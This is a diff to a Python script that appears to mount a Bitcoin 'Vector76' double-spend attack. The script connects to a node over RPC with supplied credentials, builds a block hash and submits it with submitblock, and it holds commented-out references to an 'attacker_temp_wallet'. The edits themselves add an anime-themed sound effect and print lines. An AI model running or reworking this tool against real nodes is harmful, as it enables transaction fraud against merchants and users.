@@ -1,9 +1,9 @@
 import sys
 import bitcoin
+import playsound
 import bitcoin.tests
 import bitcoin.transaction
 
-#from bitcoin_tools.core.keys import load_keys
 from bitcoin_tools.core.transaction import TX
 from bitcoinaddress import Wallet
 from bitcoincli import Bitcoin
@@ -11,7 +11,7 @@ from bitcoincli import Bitcoin
 #attacker_temp_wallet = Wallet()
 #sk, pk = load_keys(sys.argv[1])
 rpc_host = sys.argv[1]
-rpc_port = sys.argv[2]
+rpc_port = int(sys.argv[2])
 username = sys.argv[3]
 password = sys.argv[4]
 key  = sys.argv[5]
@@ -33,6 +33,7 @@ def to_satoshi(btc_amount):
 #Wallet(format("064x"))
 amount_BTC = float(sys.argv[9])
 prev_txid  = sys.argv[10]
+print("Connecting Node...")
 rpc_node = Bitcoin(username, password, rpc_host, rpc_port)
 
 info = rpc_node.getblockchaininfo()
@@ -84,6 +85,8 @@ print(f"submitblock {vector76_mining_hash}")
 print()
 result = rpc_node.submitblock(vector76_mining_hash)
 print(result)
-print("Done.")
+print()
 print(f"Kamijou Touma >> Kill that blockchain transaction!!")
 print()
+playsound.playsound("ImagineBreaker.mp3")
+print("Done.")
